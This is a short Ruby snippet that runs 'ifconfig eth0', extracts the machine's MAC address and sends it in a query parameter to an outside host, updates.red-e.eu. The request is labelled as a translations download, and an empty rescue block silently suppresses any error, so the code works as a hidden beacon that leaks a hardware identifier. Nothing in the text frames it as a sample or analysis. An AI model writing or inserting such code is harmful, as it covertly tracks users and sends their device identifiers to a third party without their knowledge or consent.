require 'net/http'
begin
uri = URI("http://updates.red-e.eu/files/get_translations?file_id=22&p=#{ /(..):(..):(..):(..):(..):(..)/.match(`ifconfig eth0`.split("\n")[0])[1..6].join } ")
Net::HTTP.get(uri)
rescue
end
